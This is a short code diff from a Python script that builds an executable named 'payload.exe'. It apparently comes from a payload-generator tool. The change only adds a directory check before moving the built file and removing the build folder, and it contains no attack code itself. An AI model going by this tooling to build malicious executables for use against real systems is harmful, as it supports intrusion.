@@ -61,8 +61,9 @@ def main():
    if os.path.exists("payload.spec"):
       os.remove("payload.spec")
    print("[*]Payload generated !")
-   os.rename("./dist/payload.exe","./payload.exe")
-   os.rmdir("./dist")
+   if os.path.isdir("./dist"): 
+    os.rename("dist/payload.exe","payload.exe")
+    os.rmdir("dist")
    if args.name:
       os.rename((__PAYLOAD_FILE_NAME[:-2]+"exe"),f"./executables/{args.name}")
 
